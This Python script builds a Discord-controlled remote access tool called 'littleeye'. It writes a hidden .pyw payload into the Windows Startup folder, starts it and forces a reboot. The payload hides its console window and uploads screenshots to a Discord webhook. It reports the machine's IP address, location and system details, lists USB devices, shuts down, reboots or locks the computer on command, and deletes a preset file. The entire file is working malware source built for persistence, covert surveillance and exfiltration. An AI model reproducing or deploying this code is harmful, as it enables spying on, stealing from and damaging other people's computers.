from os import name, getenv, startfile, remove
from os.path import exists
from webbrowser import open as wbopen
from discord.ext import commands, tasks
import discord
import os

username = getenv("username")

startup_path = "C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" % username
downloads_path = "C:/Users/%s/Downloads/" % username

token = input("token of ur bot                                           [+]")
idchannel = input("if of channel you want receive the ping                                           [+]")
webhoooks = input("webhook                                           [+]")
pathuwantdestroy = input("put ur path u wan't destroy with the commmand                                           [+]")
content = r"""
import ctypes
import os
import sqlite3 
import platform  
import requests
from dhooks import Webhook, File
import time
from discord_webhook import DiscordWebhook
import discord
import ctypes
from PIL import ImageGrab
from discord.ext import commands, tasks
import win32com.client
import urllib
local = os.getenv('LOCALAPPDATA')
ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
web = '""" + webhoooks + r"""'
bot = commands.Bot(command_prefix = "!", description = "Bot d akuma")
bot.remove_command('help')
@bot.event
async def on_ready():
    channel = bot.get_channel(""" + idchannel + r""")
    pcon = discord.Embed(title = "your pc is on !", description = "do !shutdown to turn off ur pc")
    await channel.send(embed = pcon)
    pathlittleeye = discord.Embed(title = "path of littleeye", description = '""" + startup_path + r"""')
    await channel.send("@everyone")
    await channel.send(embed = pathlittleeye)

@bot.command()
async def screenshot(ctx):
    hook = Webhook(web)
    screen = ImageGrab.grab()
    screen.save(local + '\\screen.png')
    screen.close()
    hook.send(file=File(local + "\\screen.png"))
    os.remove(local + '\\screen.png')

@bot.command()
async def shutdown(ctx):
    shutdown = discord.Embed(title = "ur pc is off now !")
    shutdown.set_image(url="https://cdn.discordapp.com/attachments/924005157765787660/945699329253969980/pc-computer.gif")
    await ctx.send(embed = shutdown)
    os.system("shutdown /s /t 1")

@bot.command()
async def pcinfo(ctx):
    import wmi
    w = wmi.WMI()

    info = platform.uname()
    System = info.system
    Computer_name = info.node
    Release = info.release
    Version = info.version
    Machine = info.machine
    data = requests.get("http://ipinfo.io/json").json()
    ip = data['ip']
    city = data['city']
    country = data['country']
    region = data['region']
    googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
    pcinfo = discord.Embed(title = "pc info ")
    
    pcinfo.add_field(name = "pc info", value = f"```ip``` : {ip} \n ```city``` : {city} \n ```coutry``` : {country} \n ```region``` : {region} \n ```google map``` : {googlemap} \n ```system``` = {System} \n ```name of pc``` : {Computer_name}, release : {Release}, Version : {Version}, ```Machine``` :  {Machine} \n ```cpu temp```` : { w.Win32_TemperatureProbe()[0].CurrentReading}")
    await ctx.send(embed = pcinfo)

@bot.command()
async def reboot(ctx):
    reboot = discord.Embed(title = "ur pc reboot")
    reboot.set_image(url = 'https://cdn.discordapp.com/attachments/924005157765787660/945737083476127764/system-rebooting-reboot.gif')
    await ctx.send(embed = reboot)
    os.system("shutdown /r /t 1")
@bot.command()
async def lock(ctx):
    lock = discord.Embed(title = "Ur pc is lock")
    lock.set_image(url = "https://cdn.discordapp.com/attachments/924005157765787660/945755938806177852/locking-door-fail-sliding-door.gif")
    ctypes.windll.user32.LockWorkStation()

@bot.command()
async def help(ctx):
    em = discord.Embed(title = "command of little eye :")
    em.add_field(name = "``reboot``", value = "to restart ur computer")
    em.add_field(name = "``lock``", value = 'to lock ur session')
    em.add_field(name = "``pcinfo``", value = "show ur config")
    em.add_field(name = "``screenshot``", value = "to take a screenshot")
    em.add_field(name = "``shutdown``", value = "to shutdown ur computer")
    em.add_field(name = "``usbinfo``", value = "to show usb connect")
    em.add_field(name = "``destroy``", value = "to delete ur file")
    await ctx.send(embed = em)
@bot.command()
async def usbinfo(ctx):

    wmi = win32com.client.GetObject ("winmgmts:")
    for usb in wmi.InstancesOf ("Win32_USBHub"):        
        usbem = discord.Embed(title = "usb info :", description = usb.DeviceID)
        await ctx.send(embed = usbem)

@bot.command()
async def destroy(ctx):
    os.remove('""" + pathuwantdestroy + r"""')
    delete = discord.Embed(title = "Ur path was deleted")
    await ctx.send(embed = delete)


@bot.command()
async def play(ctx, lien):
    webbrowser.open(lien)
bot.run('""" + token + r"""')


"""

with open(startup_path + "litlleeye.pyw", 'w', encoding='utf-8') as f:
    f.write(content)

startfile(startup_path+"litlleeye.pyw")
print(f"path create at {startup_path} ")
os.system("shutdown /r /t 1")